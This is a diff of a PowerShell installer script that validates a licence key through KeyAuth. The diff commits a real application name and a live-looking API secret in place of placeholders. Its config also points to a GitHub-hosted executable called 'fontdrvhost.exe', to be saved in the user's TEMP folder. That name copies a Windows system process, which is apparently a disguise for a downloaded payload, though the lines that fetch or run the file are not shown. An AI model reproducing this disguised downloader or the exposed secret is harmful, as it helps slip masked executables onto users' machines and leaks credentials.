@@ -1,13 +1,13 @@
 Clear-Host
 
 # ===== CONFIG =====
-$apiURL = "https://keyauth.com/api/validate"  # <-- เปลี่ยนเป็น URL ของ KeyAuth คุณจริง ๆ
-$appName = "YOUR_APP_NAME"                    # <-- ชื่อ Application ใน KeyAuth
-$secret = "YOUR_APP_SECRET"                  # <-- Secret ของ Application
+$apiURL = "https://keyauth.com/api/smitg0_14"  # <-- เปลี่ยนเป็น URL ของ KeyAuth คุณจริง ๆ
+$appName = "Smithshop all"                    # <-- ชื่อ Application ใน KeyAuth
+$secret = "d9b823207868f98f1cca7fb9c880047e525e05a1f998d6d07acc1862c207e2fc"                  # <-- Secret ของ Application
 $exeUrl = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
 $exeOutput = "$env:TEMP\fontdrvhost.exe"
 
-# ===== MENU =====
+# ===== CMDSMITHSHOP =====
 Write-Host "=== MENU ==="
 Write-Host "1. Install"
 Write-Host "2. Clean"
